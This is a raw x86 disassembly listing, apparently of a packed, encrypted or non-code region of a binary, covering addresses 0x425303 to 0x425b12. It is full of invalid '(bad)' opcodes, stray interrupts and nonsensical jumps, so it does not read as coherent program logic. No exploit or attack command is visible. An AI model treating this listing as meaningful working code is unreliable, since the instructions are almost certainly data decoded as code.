  425303:	sub    BYTE PTR [ebx+0x13],dl
  425306:	das    
  425307:	rol    DWORD PTR [edx],1
  425309:	jmp    0x4252aa
  42530b:	add    BYTE PTR [eax-0x6723280],0xcd
  425312:	xchg   esi,eax
  425313:	stc    
  425314:	cmp    ebx,ecx
  425316:	shr    edx,cl
  425318:	sub    BYTE PTR [ebx],bh
  42531a:	jge    0x4252ef
  42531c:	jmp    0x4252b0
  42531e:	push   ebx
  42531f:	adc    ecx,ebp
  425321:	xchg   esi,eax
  425322:	std    
  425323:	int    0xa6
  425325:	std    
  425326:	cmp    esi,ecx
  425328:	cmp    esp,ecx
  42532a:	shl    ebx,cl
  42532c:	xchg   edx,eax
  42532d:	shl    ebp,cl
  42532f:	sub    BYTE PTR [ebx-0x2b],dl
  425332:	push   es
  425333:	adc    ecx,ebp
  425335:	xchg   esi,eax
  425336:	stc    
  425337:	int    0x8d
  425339:	stc    
  42533a:	aam    0x58
  42533c:	cmp    esi,eax
  42533e:	shl    edx,cl
  425340:	sub    BYTE PTR [ebx],bh
  425342:	icebp  
  425343:	shl    ebx,cl
  425345:	xchg   edx,eax
  425346:	push   ebx
  425347:	jecxz  0x425316
  425349:	(bad)  
  42534a:	std    
  42534b:	int    0xa6
  42534d:	std    
  42534e:	cmp    edi,DWORD PTR [ebp+0x3b]
  425351:	loope  0x425326
  425353:	jmp    0x4252e7
  425355:	shl    ebp,cl
  425357:	sub    BYTE PTR [ebx+0xc],dl
  42535a:	aad    0xf3
  42535c:	int    0x8d
  42535e:	in     eax,dx
  42535f:	int    0xa6
  425361:	in     eax,dx
  425362:	cmp    edi,DWORD PTR [ebp+0x3b]
  425365:	loope  0x42533a
  425367:	jmp    0x4252fb
  425369:	shl    ebp,cl
  42536b:	sub    BYTE PTR [ebx+0xc],dl
  42536e:	cmp    esp,ebx
  425370:	in     al,dx
  425371:	sub    al,0x3b
  425373:	lock shl edx,cl
  425376:	sub    BYTE PTR [ebx],bh
  425378:	icebp  
  425379:	shl    ebx,cl
  42537b:	xchg   edx,eax
  42537c:	push   ebx
  42537d:	jecxz  0x42534c
  42537f:	(bad)  
  425380:	std    
  425381:	int    0xa6
  425383:	std    
  425384:	cmp    edi,DWORD PTR [ebp+0x3b]
  425387:	loope  0x42535c
  425389:	jmp    0x42531d
  42538b:	shl    ebp,cl
  42538d:	sub    BYTE PTR [ebx+0xc],dl
  425390:	aad    0xf3
  425392:	or     dl,BYTE PTR [esi-0x2723207]
  425398:	int    0x96
  42539a:	std    
  42539b:	cmp    edi,DWORD PTR [ebp+0x3b]
  42539e:	(bad)  
  4253a0:	jmp    0x425334
  4253a2:	shr    edx,cl
  4253a4:	sub    BYTE PTR [ebx+0x13],dl
  4253a7:	xchg   DWORD PTR [edx],eax
  4253a9:	int    0x8d
  4253ab:	cmc    
  4253ac:	int    0x96
  4253ae:	cmc    
  4253af:	cmp    ebx,ecx
  4253b1:	cmp    edi,DWORD PTR [ebp-0x2d]
  4253b4:	jmp    0x1353:0x92ebd328
  4253bb:	int    0x96
  4253bd:	std    
  4253be:	int    0xa6
  4253c0:	std    
  4253c1:	cmp    esi,ecx
  4253c3:	cmp    esp,ecx
  4253c5:	shl    ebp,cl
  4253c7:	sub    bl,dl
  4253c9:	repz xchg edx,eax
  4253cb:	push   ebx
  4253cc:	aad    0x33
  4253ce:	adc    eax,DWORD PTR [ebx+0x2]
  4253d1:	das    
  4253d2:	pop    es
  4253d3:	pop    edx
  4253d4:	add    BYTE PTR [eax],al
  4253d6:	add    ch,cl
  4253d8:	jbe    0x4253d3
  4253da:	int    0x8d
  4253dc:	mov    BYTE PTR [edx-0x327ef558],ch
  4253e2:	jbe    0x4253dd
  4253e4:	arpl   bx,cx
  4253e6:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  4253ed:	ins    DWORD PTR es:[edi],dx
  4253ee:	pop    esi
  4253ef:	jbe    0x42543d
  4253f1:	aam    0x3a
  4253f3:	pop    esi
  4253f4:	jbe    0x42537e
  4253f6:	fdiv   DWORD PTR [edx]
  4253f8:	retf   0x8814
  4253fb:	or     DWORD PTR [esi-0x69a6d0d1],edx
  425401:	das    
  425402:	adc    dh,bl
  425404:	in     eax,dx
  425405:	add    BYTE PTR [eax+0x2f960980],0xf1
  42540c:	lea    ebp,[edi]
  42540e:	retf   0x2f96
  425411:	or     DWORD PTR [eax+ecx*4],edx
  425414:	ins    BYTE PTR es:[edi],dx
  425415:	inc    ebx
  425416:	jbe    0x4253a0
  425418:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  42541f:	stc    
  425420:	std    
  425421:	add    BYTE PTR [eax],al
  425423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425424:	ror    BYTE PTR [eax-0x12326980],cl
  42542a:	adc    ch,ch
  42542c:	cmp    al,0x84
  42542e:	add    BYTE PTR [eax+0x49bf985b],0x21
  425435:	xchg   BYTE PTR ds:0xc911a60a,dh
  42543b:	jbe    0x42543a
  42543d:	inc    ecx
  42543e:	and    DWORD PTR [esi-0x128936cb],eax
  425444:	dec    ecx
  425445:	sub    DWORD PTR [esi-0x4a8936cb],eax
  42544b:	jno    0x425403
  42544d:	cli    
  42544e:	arpl   bp,cx
  425450:	jbe    0x425463
  425452:	int    0x8d
  425454:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  42545a:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  425464:	repnz sub BYTE PTR [ebx-0x2d],dl
  425468:	or     dh,BYTE PTR [esi-0x7]
  42546b:	leave  
  42546c:	jbe    0x425413
  42546e:	into   
  42546f:	and    DWORD PTR [esi-0x628936cb],eax
  425475:	inc    esi
  425476:	sbb    DWORD PTR [ebp-0x528936de],esi
  42547c:	mov    BYTE PTR [eax-0x34327f80],al
  425482:	int    0x76
  425484:	std    
  425485:	int    0x8d
  425487:	std    
  425488:	cmp    esi,eax
  42548a:	shl    edx,cl
  42548c:	sub    BYTE PTR [ebx],bh
  42548e:	jns    0x425463
  425490:	mov    ebp,0xcdd35392
  425495:	lea    edx,[ecx]
  425497:	int    0x96
  425499:	adc    DWORD PTR [ebx],edi
  42549b:	(bad)  
  42549d:	(bad)  
  42549f:	jmp    0x425433
  4254a1:	shr    edx,cl
  4254a3:	sub    BYTE PTR [ebx+0x13],dl
  4254a6:	das    
  4254a7:	rcl    ebx,1
  4254a9:	in     al,dx
  4254aa:	outs   dx,BYTE PTR ds:[esi]
  4254ab:	int    0x76
  4254ad:	cmc    
  4254ae:	int    0x8d
  4254b0:	cmc    
  4254b1:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  4254b7:	push   ebx
  4254b8:	sar    DWORD PTR [ebx],cl
  4254ba:	lds    ecx,FWORD PTR [edx]
  4254bc:	jbe    0x4254b7
  4254be:	iret   
  4254bf:	jbe    0x4254ba
  4254c1:	jo     0x425480
  4254c3:	mov    ecx,0xa0000fe
  4254c8:	jbe    0x4254c3
  4254ca:	int    0x76
  4254cc:	stc    
  4254cd:	int    0x8d
  4254cf:	cmc    
  4254d0:	or     al,BYTE PTR ds:0xfc9dcf
  4254d6:	add    ch,cl
  4254d8:	jbe    0x4254d7
  4254da:	int    0x8d
  4254dc:	std    
  4254dd:	cmp    edi,DWORD PTR [ecx+0x3b]
  4254e0:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4254e7:	push   ebx
  4254e8:	rol    DWORD PTR [edi+0x760af576],cl
  4254ee:	cmc    
  4254ef:	int    0x76
  4254f1:	in     eax,dx
  4254f2:	int    0x8d
  4254f4:	in     eax,dx
  4254f5:	cmp    esi,eax
  4254f7:	shl    edx,cl
  4254f9:	sub    BYTE PTR [ebx],bh
  4254fb:	jns    0x4254d0
  4254fd:	mov    ebp,0xcdd35392
  425502:	(bad)  
  425503:	std    
  425504:	int    0x96
  425506:	std    
  425507:	cmp    ecx,DWORD PTR [edi]
  425509:	cmp    ebx,ecx
  42550b:	shr    ebx,cl
  42550d:	xchg   edx,eax
  42550e:	shr    edx,cl
  425510:	sub    BYTE PTR [ebx+0x13],dl
  425513:	xor    edx,ebx
  425515:	int    0x8d
  425517:	cmc    
  425518:	inc    ebx
  425519:	jge    0x4254f3
  42551b:	mov    bl,0xcd
  42551d:	jbe    0x4254d4
  42551f:	int    0x8d
  425521:	mov    ch,0x3b
  425523:	jns    0x425560
  425525:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42552c:	push   ebx
  42552d:	ror    DWORD PTR [edx],cl
  42552f:	jbe    0x42552a
  425531:	leave  
  425532:	jbe    0x425521
  425534:	bound  ebx,QWORD PTR [edi]
  425536:	xchg   BYTE PTR ds:0x1ebddcd,dh
  42553c:	add    BYTE PTR [eax-0x5a723280],0xcd
  425543:	jbe    0x4254ea
  425545:	cmp    ecx,ecx
  425547:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  42554d:	jmp    0x4254e1
  42554f:	push   ebx
  425550:	jge    0x42551f
  425552:	jbe    0x42554d
  425554:	aad    0xbd
  425556:	or     dh,BYTE PTR [esi-0x63]
  425559:	int    0x76
  42555b:	mov    dl,cl
  42555d:	or     BYTE PTR [ecx],0x76
  425560:	in     al,dx
  425561:	retf   0xec76
  425564:	int    0x8d
  425566:	stc    
  425567:	das    
  425568:	pop    ecx
  425569:	ins    DWORD PTR es:[edi],dx
  42556a:	cmp    edx,ebx
  42556c:	or     dh,BYTE PTR [esi-0xb]
  42556f:	int    0x76
  425571:	in     eax,dx
  425572:	int    0x8d
  425574:	in     eax,dx
  425575:	cmp    edi,DWORD PTR [ecx-0x2d]
  425578:	mov    ebp,0xd3f03b92
  42557d:	repnz sub BYTE PTR [ebx-0x2d],dl
  425581:	int    0x8d
  425583:	cmc    
  425584:	sub    edx,ebx
  425586:	int    0x5
  425588:	push   es
  425589:	popf   
  42558a:	cld    
  42558b:	add    BYTE PTR [eax],al
  42558d:	int    0x8d
  42558f:	popf   
  425590:	cmp    edx,ebx
  425592:	or     dh,BYTE PTR [esi-0x7]
  425595:	int    0x76
  425597:	std    
  425598:	int    0x8d
  42559a:	std    
  42559b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42559e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4255a5:	push   ebx
  4255a6:	rol    DWORD PTR [ecx+0x76cd8876],cl
  4255ac:	std    
  4255ad:	int    0x8d
  4255af:	std    
  4255b0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4255b3:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4255ba:	push   ebx
  4255bb:	sar    DWORD PTR [esi],cl
  4255bd:	jbe    0x42556c
  4255bf:	int    0x76
  4255c1:	adc    ebp,ecx
  4255c3:	lea    edx,[ecx]
  4255c5:	cmp    esi,eax
  4255c7:	cmp    edi,DWORD PTR [ecx-0x2d]
  4255ca:	repnz sub bl,dl
  4255cd:	mov    ebp,0xcdd35392
  4255d2:	lea    ebp,[ebp+0x62f7d43]
  4255d8:	imul   eax,DWORD PTR [eax],0x0
  4255db:	add    ch,cl
  4255dd:	jbe    0x425594
  4255df:	int    0x8d
  4255e1:	mov    ch,0x3b
  4255e3:	jns    0x425620
  4255e5:	lock shl edx,cl
  4255e8:	sub    bl,dl
  4255ea:	mov    ebp,0xd353aa92
  4255ef:	int    0x8d
  4255f1:	stc    
  4255f2:	test   al,0x3b
  4255f4:	shl    DWORD PTR [ebx-0x35],cl
  4255f7:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  4255fe:	in     eax,dx
  4255ff:	xor    BYTE PTR [ebx],bh
  425601:	retf   
  425602:	pop    ebx
  425603:	call   0xbb05:0x2f888d5e
  42560a:	add    BYTE PTR [eax+0x2f024380],0x5
  425611:	rol    DWORD PTR [eax-0x44d07f80],1
  425617:	cwde   
  425618:	sub    al,0x5d
  42561a:	lahf   
  42561b:	xor    eax,0x8d0a8080
  425620:	std    
  425621:	or     cl,BYTE PTR [ebp+0xaf13b11]
  425627:	(bad)  
  425628:	stc    
  425629:	mov    eax,0xe3b813cd
  42562e:	retf   
  42562f:	cmp    eax,DWORD PTR [eax]
  425631:	leave  
  425632:	jbe    0x425629
  425634:	adc    al,0x80
  425636:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  42563d:	mov    eax,0xb8fde6cd
  425642:	jecxz  0x42560d
  425644:	mov    eax,0xbb2ff93b
  425649:	(bad)  
  42564a:	stc    
  42564b:	iret   
  42564c:	dec    esp
  42564d:	into   
  42564e:	mov    eax,0xd692de5e
  425653:	pop    edx
  425654:	das    
  425655:	mov    ebx,0xf58d0a89
  42565a:	mov    eax,0x4dd67d43
  42565f:	das    
  425660:	mov    ebx,0xa6cdfd8d
  425665:	mov    BYTE PTR [ecx],al
  425667:	fs push ds
  425669:	adc    ah,0x3b
  42566c:	das    
  42566d:	mov    ebx,0xa6cdfd8d
  425672:	mov    BYTE PTR [eax+0x1e4c692f],bh
  425678:	mov    eax,0x3bb8d3e3
  42567d:	jge    0x425637
  42567f:	pop    esi
  425680:	(bad)  
  425681:	cmc    
  425682:	aam    0x23
  425684:	leave  
  425685:	jbe    0x42567c
  425687:	sbb    BYTE PTR [eax+0x76008080],al
  42568d:	stc    
  42568e:	int    0x7d
  425690:	mov    eax,0xb82c8e3b
  425695:	jecxz  0x425662
  425697:	mov    eax,0x82f98d5e
  42569c:	inc    ecx
  42569d:	in     al,dx
  42569e:	dec    edx
  42569f:	add    BYTE PTR [esi+0x11],dh
  4256a2:	leave  
  4256a3:	jbe    0x42569a
  4256a5:	push   ss
  4256a6:	add    BYTE PTR [eax-0x1944d080],0xfd
  4256ad:	int    0xa6
  4256af:	mov    BYTE PTR [ebx],bh
  4256b1:	retf   
  4256b2:	pop    esp
  4256b3:	dec    esp
  4256b4:	sub    dl,ah
  4256b6:	push   ss
  4256b7:	add    BYTE PTR [esi-0x3],dh
  4256ba:	add    al,0xe6
  4256bc:	cmc    
  4256bd:	sbb    BYTE PTR [edi],ch
  4256bf:	push   es
  4256c0:	jb     0x4256c2
  4256c2:	add    BYTE PTR [eax],al
  4256c4:	cmp    ebp,DWORD PTR [ebp-0x56]
  4256c7:	arpl   bx,cx
  4256c9:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  4256d0:	jecxz  0x4256a5
  4256d2:	mov    eax,0x6d3b7d3b
  4256d7:	mov    eax,0x2f2c8e43
  4256dc:	adc    eax,0x96b9ec6d
  4256e1:	int    0xed
  4256e3:	add    al,0xed
  4256e5:	mov    esp,0xc09a985b
  4256ea:	inc    esp
  4256eb:	add    dh,dl
  4256ed:	mov    ch,cl
  4256ef:	adc    DWORD PTR [ebp+0xf90b],edi
  4256f5:	iret   
  4256f6:	js     0x42572a
  4256f8:	or     dh,BYTE PTR [esi+0x25]
  4256fb:	iret   
  4256fc:	js     0x425772
  4256fe:	or     dh,BYTE PTR [esi+0x2d]
  425701:	iret   
  425702:	js     0x4256bc
  425704:	or     dh,BYTE PTR [esi+0x35]
  425707:	iret   
  425708:	pop    es
  425709:	or     DWORD PTR [eax+0x760a8080],eax
  42570f:	cmp    eax,0x804107cf
  425714:	add    BYTE PTR [eax-0x30ba89f6],0x7
  42571b:	or     eax,0xa808080
  425720:	jbe    0x4256f2
  425722:	iret   
  425723:	pop    es
  425724:	out    dx,eax
  425725:	add    BYTE PTR [eax+0x55760a80],0xcf
  42572c:	pop    es
  42572d:	xor    BYTE PTR [ecx+0x760a8080],al
  425733:	pop    ebp
  425734:	iret   
  425735:	pop    es
  425736:	inc    edx
  425737:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  425741:	pop    es
  425742:	xchg   esp,eax
  425743:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  42574d:	add    BYTE PTR [eax-0x25c4af33],0xa
  425754:	xchg   esi,eax
  425755:	icebp  
  425756:	or     dl,BYTE PTR [esi-0x6269f56b]
  42575c:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  425762:	(bad)  
  425763:	mov    cl,0xde
  425765:	adc    ebx,DWORD PTR [ebp-0x43]
  425768:	or     ah,BYTE PTR [ebx]
  42576a:	and    eax,0xcd0d760a
  42576f:	lea    edi,[ebp-0x33]
  425772:	out    0xd,al
  425774:	cmp    edi,ecx
  425776:	adc    al,BYTE PTR [edx]
  425778:	jnp    0x4257b1
  42577a:	ficom  WORD PTR [ebx]
  42577c:	das    
  42577d:	inc    ebp
  42577e:	cli    
  42577f:	xchg   edx,eax
  425780:	rcl    DWORD PTR [eax],cl
  425782:	xchg   edx,eax
  425783:	or     ah,dh
  425785:	mov    ch,0xcd
  425787:	out    0x7d,al
  425789:	int    0xa6
  42578b:	or     eax,0x3be1cd
  425790:	cmp    eax,DWORD PTR [ebx]
  425792:	shl    ebp,cl
  425794:	sub    BYTE PTR [ebx-0x10],dl
  425797:	int    0xe6
  425799:	mov    ch,0x61
  42579b:	add    BYTE PTR [eax-0x1dc49380],0x53
  4257a2:	cld    
  4257a3:	push   ebx
  4257a4:	lock or dl,dh
  4257a7:	stc    
  4257a8:	das    
  4257a9:	add    eax,0x808080f2
  4257ae:	adc    dh,BYTE PTR [esi-0xf]
  4257b1:	(bad)  
  4257b2:	mov    esp,0xeb5f8bbd
  4257b7:	or     ah,BYTE PTR [ebx]
  4257b9:	and    eax,0x12958d31
  4257be:	jbe    0x42575d
  4257c0:	(bad)  
  4257c1:	mov    esp,0x8d318790
  4257c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257c7:	int    0x8d
  4257c9:	jge    0x425798
  4257cb:	(bad)  
  4257cc:	or     eax,0xcd7de6cd
  4257d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257d2:	or     eax,0x212113b
  4257d7:	jnp    0x425810
  4257d9:	ficom  WORD PTR [ebx]
  4257db:	das    
  4257dc:	inc    ebp
  4257dd:	add    dl,BYTE PTR [edx-0x2cd7162d]
  4257e3:	out    dx,eax
  4257e4:	xchg   edx,eax
  4257e5:	cmp    ebx,ebp
  4257e7:	cmp    eax,DWORD PTR [ebx]
  4257e9:	push   ebx
  4257ea:	or     al,0x53
  4257ec:	clc    
  4257ed:	add    al,0xd3
  4257ef:	add    BYTE PTR [ecx+ebx*4],al
  4257f2:	add    BYTE PTR [edx],cl
  4257f4:	lea    edi,[ebp+0xa]
  4257f7:	(bad)  
  4257f8:	or     eax,0x53f18dcd
  4257fd:	lea    edx,[ebp+0x761223d4]
  425803:	icebp  
  425804:	mov    edx,DWORD PTR [ebx]
  425806:	dec    edx
  425807:	stc    
  425808:	pop    edi
  425809:	sbb    al,bl
  42580b:	mov    ch,0x6b
  42580d:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  425813:	(bad)
  425816:	std    
  425817:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  42581d:	(bad)  
  42581e:	icebp  
  42581f:	(bad)  
  425820:	mov    esp,0x76897abd
  425825:	xchg   ebp,eax
  425826:	adc    dh,BYTE PTR [esi-0x6f433963]
  42582c:	add    al,0x12
  42582e:	mov    dh,0xa5
  425830:	jmp    0x42583c
  425832:	and    esp,DWORD PTR ds:0xcd7d8dcd
  425838:	lea    ecx,ds:0xcd7de6cd
  42583e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42583f:	or     eax,0x92fc352f
  425844:	shr    ebx,cl
  425846:	sub    BYTE PTR [ebx],bh
  425848:	not    DWORD PTR [ebx-0xc]
  42584b:	shr    ecx,cl
  42584d:	xchg   edx,eax
  42584e:	push   ebx
  42584f:	lock adc al,BYTE PTR [edx]
  425852:	(bad)  
  425853:	aaa    
  425854:	ficom  WORD PTR [ebx]
  425856:	or     cl,BYTE PTR [ebp+0xa113b7d]
  42585c:	(bad)  
  42585d:	or     eax,0xcd7d8dcd
  425862:	(bad)  
  425863:	or     eax,0xcd7de6cd
  425868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425869:	or     eax,0x212113b
  42586e:	jnp    0x4258a7
  425870:	ficom  WORD PTR [ebx]
  425872:	das    
  425873:	inc    ebp
  425874:	add    dl,BYTE PTR [edx-0x2cd7162d]
  42587a:	out    dx,eax
  42587b:	xchg   edx,eax
  42587c:	cmp    ebx,ebp
  42587e:	cmp    eax,DWORD PTR [ebx]
  425880:	push   ebx
  425881:	or     al,0x53
  425883:	clc    
  425884:	push   ebx
  425885:	comiss xmm0,DWORD PTR [esi]
  425888:	xor    al,BYTE PTR [eax]
  42588a:	add    BYTE PTR [eax],al
  42588c:	int    0xd6
  42588e:	stc    
  42588f:	push   es
  425890:	imul   DWORD PTR [edi]
  425892:	add    eax,0x808080d1
  425897:	int    0x78
  425899:	fs int 0xe4
  42589c:	push   eax
  42589d:	fadd   QWORD PTR [edi+0x349acdff]
  4258a3:	int    0x6f
  4258a5:	and    al,0xcd
  4258a7:	jp     0x4258d5
  4258a9:	int    0xaa
  4258ab:	sbb    al,0x87
  4258ad:	cdq    
  4258ae:	or     dl,BYTE PTR [esi+0x149acd0d]
  4258b4:	xchg   DWORD PTR [edi],ecx
  4258b6:	xchg   DWORD PTR [ecx+0xa],edi
  4258b9:	(bad)  
  4258ba:	in     eax,dx
  4258bb:	or     dh,BYTE PTR [esi-0x6b]
  4258be:	or     dl,BYTE PTR [esi+0x7bd543f5]
  4258c4:	xchg   DWORD PTR [edx],ecx
  4258c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258c7:	cmc    
  4258c8:	cmp    ebx,edx
  4258ca:	or     dl,BYTE PTR [esi-0xa69a15b]
  4258d0:	fcom   st(4)
  4258d2:	in     al,dx
  4258d3:	xchg   ebp,ecx
  4258d5:	jbe    0x42586c
  4258d7:	int    0xa6
  4258d9:	or     eax,0x5b24bb2f
  4258de:	inc    ebx
  4258df:	call   0x14aa:0x436b771c
  4258e6:	ja     0x425890
  4258e8:	int    0x84
  4258ea:	mov    al,0xcd
  4258ec:	xchg   esi,eax
  4258ed:	mov    ch,cl
  4258ef:	and    al,0x1f
  4258f1:	or     dl,BYTE PTR [esi-0x30867803]
  4258f7:	xchg   esi,eax
  4258f8:	sbb    eax,0x9633a987
  4258fd:	mov    BYTE PTR [edx],cl
  4258ff:	jbe    0x425912
  425901:	or     dl,BYTE PTR [esi-0x4a89368b]
  425907:	push   ebx
  425908:	add    BYTE PTR [eax-0x2693280],0x4
  42590f:	pusha  
  425910:	adc    dh,0x28
  425913:	jo     0x4258e2
  425915:	jbe    0x42598c
  425917:	int    0x54
  425919:	xor    BYTE PTR [ebp+0xfddd],bh
  42591f:	int    0xd6
  425921:	stc    
  425922:	int    0x8d
  425924:	in     eax,dx
  425925:	push   es
  425926:	ins    DWORD PTR es:[edi],dx
  425927:	aam    0x85
  425929:	int    0x76
  42592b:	std    
  42592c:	or     bl,BYTE PTR [ecx*8+0x76041176]
  425933:	std    
  425934:	test   BYTE PTR [eax],al
  425936:	lea    esi,[ebp-0x69321c2a]
  42593c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42593d:	push   edx
  42593e:	or     dl,BYTE PTR [esi-0xa69bc5b]
  425944:	or     dh,0xaa
  425947:	int    0x79
  425949:	test   al,0x63
  42594b:	retf   
  42594c:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  425953:	int    0xd6
  425955:	mov    BYTE PTR [eax],al
  425957:	pop    ecx
  425958:	adc    DWORD PTR [ecx+0x76cd8080],eax
  42595e:	mov    BYTE PTR [ebp+0xfee4],bh
  425964:	int    0x7
  425966:	cmp    eax,0x3b808081
  42596b:	retf   
  42596c:	pop    esi
  42596d:	mov    BYTE PTR [eax-0x322ce8d1],ch
  425973:	shl    DWORD PTR [esi-0x327f7b2e],cl
  425979:	fwait
  42597a:	sbb    eax,0x5b808081
  42597f:	cwde   
  425980:	int    0x11
  425982:	pop    ebp
  425983:	lahf   
  425984:	xor    eax,0x4eec8080
  425989:	cmp    edi,DWORD PTR [ebp-0x48]
  42598c:	jecxz  0x425959
  42598e:	mov    eax,0xd2044a0a
  425993:	xchg   edx,eax
  425994:	add    al,0x79
  425996:	xchg   edx,eax
  425997:	das    
  425998:	mov    ebx,0x7d43b84e
  42599d:	(bad)  
  42599e:	repz cmp ebp,DWORD PTR [ebp-0x58]
  4259a2:	mov    eax,0x8cd920a
  4259a7:	sbb    eax,0x63808081
  4259ac:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  4259b2:	sbb    eax,0xd3808081
  4259b7:	jmp    0xed0be142
  4259bc:	dec    edx
  4259bd:	add    DWORD PTR [edx],eax
  4259bf:	add    DWORD PTR [ecx],0xffffffeb
  4259c2:	mov    esi,0x526c8809
  4259c7:	retf   0x14a
  4259ca:	cli    
  4259cb:	sbb    dh,dl
  4259cd:	adc    BYTE PTR [ecx-0x80],bh
  4259d0:	or     ch,0x7
  4259d3:	sbb    eax,0x87808081
  4259d8:	leave  
  4259d9:	stos   BYTE PTR es:[edi],al
  4259da:	lds    edx,FWORD PTR [esi-0x12ed1233]
  4259e0:	mov    al,0x80
  4259e2:	add    BYTE PTR [eax+0xabd5f5b],0x23
  4259e9:	and    eax,0x76c99a98
  4259ee:	cmc    
  4259ef:	xchg   ecx,eax
  4259f0:	aaa    
  4259f1:	ficom  WORD PTR [ebx]
  4259f3:	or     cl,BYTE PTR [ebp-0x12893607]
  4259f9:	(bad)  
  4259fa:	aaa    
  4259fb:	ficom  WORD PTR [ebx]
  4259fd:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  425a03:	jbe    0x4259c2
  425a05:	dec    ecx
  425a06:	and    DWORD PTR [esi-0x28936cb],eax
  425a0c:	inc    ecx
  425a0d:	and    DWORD PTR [esi-0xe8936cb],eax
  425a13:	out    0x37,al
  425a15:	ficom  WORD PTR [ebx]
  425a17:	or     cl,BYTE PTR [ebp+0x5d76c995]
  425a1d:	fidiv  WORD PTR [edi]
  425a1f:	ficom  WORD PTR [ebx]
  425a21:	or     cl,BYTE PTR [ebp-0x1289329b]
  425a27:	int    0x96
  425a29:	adc    DWORD PTR [edi],ebp
  425a2b:	inc    ebp
  425a2c:	icebp  
  425a2d:	xchg   edx,eax
  425a2e:	shl    ebx,cl
  425a30:	xchg   edx,eax
  425a31:	int    0x96
  425a33:	in     eax,dx
  425a34:	int    0xd6
  425a36:	adc    ebx,edx
  425a38:	jmp    0x4229:0xbea6c328
  425a3f:	cmp    ecx,ecx
  425a41:	cmp    esi,edi
  425a43:	push   ebx
  425a44:	jns    0x425a50
  425a46:	jbe    0x4259ed
  425a48:	iret   
  425a49:	jbe    0x4259f8
  425a4b:	or     dh,BYTE PTR [esi+0xd]
  425a4e:	int    0x76
  425a50:	or     eax,0x8621d169
  425a55:	xor    eax,0x37b680c9
  425a5a:	ficom  WORD PTR [ebx]
  425a5c:	or     bh,BYTE PTR [esp+eax*4-0x33]
  425a60:	(bad)  
  425a61:	std    
  425a62:	int    0x96
  425a64:	std    
  425a65:	cmp    ecx,DWORD PTR [edi]
  425a67:	shr    ebx,cl
  425a69:	xchg   edx,eax
  425a6a:	sar    bh,0x9c
  425a6d:	cmp    esi,ecx
  425a6f:	shr    edx,cl
  425a71:	sub    BYTE PTR [ebx+0x13],dl
  425a74:	int    0x96
  425a76:	std    
  425a77:	int    0xa6
  425a79:	std    
  425a7a:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a80:	popf   
  425a81:	shl    ebp,cl
  425a83:	sub    BYTE PTR [ebx-0x2b],dl
  425a86:	xchg   DWORD PTR [ebx],edx
  425a88:	int    0x96
  425a8a:	std    
  425a8b:	int    0xa6
  425a8d:	std    
  425a8e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a94:	popf   
  425a95:	shl    ebp,cl
  425a97:	sub    BYTE PTR [ebx-0x2b],dl
  425a9a:	xchg   DWORD PTR [ebx],edx
  425a9c:	int    0x96
  425a9e:	std    
  425a9f:	int    0xa6
  425aa1:	std    
  425aa2:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425aa8:	popf   
  425aa9:	shl    ebp,cl
  425aab:	sub    BYTE PTR [ebx-0x2b],dl
  425aae:	xchg   DWORD PTR [ebx],edx
  425ab0:	or     cl,bh
  425ab2:	nop
  425ab3:	add    BYTE PTR [eax],al
  425ab5:	add    ch,cl
  425ab7:	lea    edi,[ebp+0x3bbd96cd]
  425abd:	icebp  
  425abe:	cmp    ecx,DWORD PTR [edi]
  425ac0:	shr    edx,cl
  425ac2:	sub    bl,dl
  425ac4:	jmp    0x425a58
  425ac6:	push   ebx
  425ac7:	adc    ecx,ebp
  425ac9:	xchg   esi,eax
  425aca:	mov    ebp,0x3bbda6cd
  425acf:	cdq    
  425ad0:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425ad6:	in     eax,0x28
  425ad8:	push   ebx
  425ad9:	aad    0xa
  425adb:	int3   
  425adc:	pop    ss
  425add:	aam    0x0
  425adf:	add    BYTE PTR [eax],al
  425ae1:	int    0x8d
  425ae3:	dec    esp
  425ae4:	int    0x89
  425ae6:	int    0x96
  425ae8:	std    
  425ae9:	int    0xa6
  425aeb:	std    
  425aec:	int    0x7e
  425aee:	jo     0x425b2b
  425af0:	popf   
  425af1:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425af7:	in     eax,0x28
  425af9:	push   ebx
  425afa:	aad    0xa
  425afc:	int3   
  425afd:	pop    ss
  425afe:	aam    0x0
  425b00:	add    BYTE PTR [eax],al
  425b02:	int    0x8d
  425b04:	xor    ch,cl
  425b06:	xchg   esi,eax
  425b07:	xor    BYTE PTR [ebx],bh
  425b09:	icebp  
  425b0a:	cmp    ecx,DWORD PTR [edi]
  425b0c:	shr    edx,cl
  425b0e:	sub    bl,dl
  425b10:	jmp    0x425aa4
  425b12:	push   ebx
